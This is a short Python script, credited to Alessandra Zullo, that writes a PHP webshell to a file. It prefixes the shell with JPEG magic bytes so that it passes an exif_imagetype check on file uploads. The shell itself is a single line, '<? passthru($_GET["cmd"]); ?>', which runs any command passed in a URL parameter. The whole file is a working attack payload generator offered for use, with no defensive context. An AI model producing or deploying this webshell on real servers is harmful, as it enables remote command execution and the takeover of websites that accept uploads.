# Script Name		: shellImage.py
# Author				: Alessandra Zullo
# Created				: Ottobre 2017
# Version				: 0.1
# Description		: Create a webshell (php) that bypass exif_imagetype. THis function that checks the type of upload's file.
fh = open('webshell.php', 'w')
fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')
fh.close()
